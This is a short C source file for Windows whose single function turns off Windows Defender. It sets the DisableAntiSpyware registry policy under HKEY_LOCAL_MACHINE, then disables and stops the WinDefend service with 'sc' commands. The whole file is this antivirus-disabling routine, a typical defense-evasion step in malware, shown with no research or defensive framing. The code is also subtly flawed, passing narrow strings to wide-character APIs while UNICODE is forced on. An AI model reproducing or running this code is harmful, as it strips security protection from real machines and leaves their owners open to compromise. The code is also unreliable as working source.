#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif
#include <stdio.h>
#include <conio.h>
#define UNICODE
#define _UNICODE
#include <windows.h>
#include <time.h>



void disable_windows_defender(){
    HKEY hkey;
    const char* subkey ="SOFTWARE\\Policies\\Microsoft\\Windows Defender";
    DWORD disable_value = 1;


    //create or open edit register
    if (RegCreateKeyEx(HKEY_LOCAL_MACHINE,subkey,0,NULL,REG_OPTION_NON_VOLATILE,KEY_WRITE,NULL,&hkey,NULL) == ERROR_SUCCESS){
        RegSetValueEx(hkey,"DisableAntiSpyware",0,REG_DWORD,(const BYTE*)&disable_value,sizeof(disable_value));
        RegCloseKey(hkey);
        printf("Updated registry to disable Windows Defender.\n");
        Sleep(5000);
        

    }else{
        printf("ERROR");

        return;
    }
    system("sc config WinDefend start= disabled");
    system("sc stop WinDefend");

    printf("success");
    Sleep(5000);
}